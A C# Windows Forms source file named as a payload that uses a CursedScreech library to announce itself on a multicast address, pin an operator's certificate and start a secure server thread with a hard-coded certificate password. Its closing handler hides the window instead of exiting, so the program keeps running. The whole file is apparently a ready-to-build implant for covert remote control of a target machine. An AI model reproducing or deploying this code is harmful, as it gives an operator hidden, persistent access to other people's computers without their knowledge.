using System;
using System.Drawing;
using System.Windows.Forms;
using CursedScreech;

namespace Payload
{
    public partial class Form1 : Form {

        public Form1() {
            InitializeComponent();
            
			CursedScreech.CursedScreech cs = new CursedScreech.CursedScreech();
            cs.startMulticaster("231.253.78.29", 19578);
            cs.setRemoteCertificateSerial("69-22-04-B7-8F-BA-AD-AB-00");
            cs.setRemoteCertificateHash("11250BAF617DDDBC46320312EA11714BBF912BA2");
            cs.startSecureServerThread("Payload.Target.pfx", "password");
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e) {
            e.Cancel = true;
            this.Hide();
        }
    }
}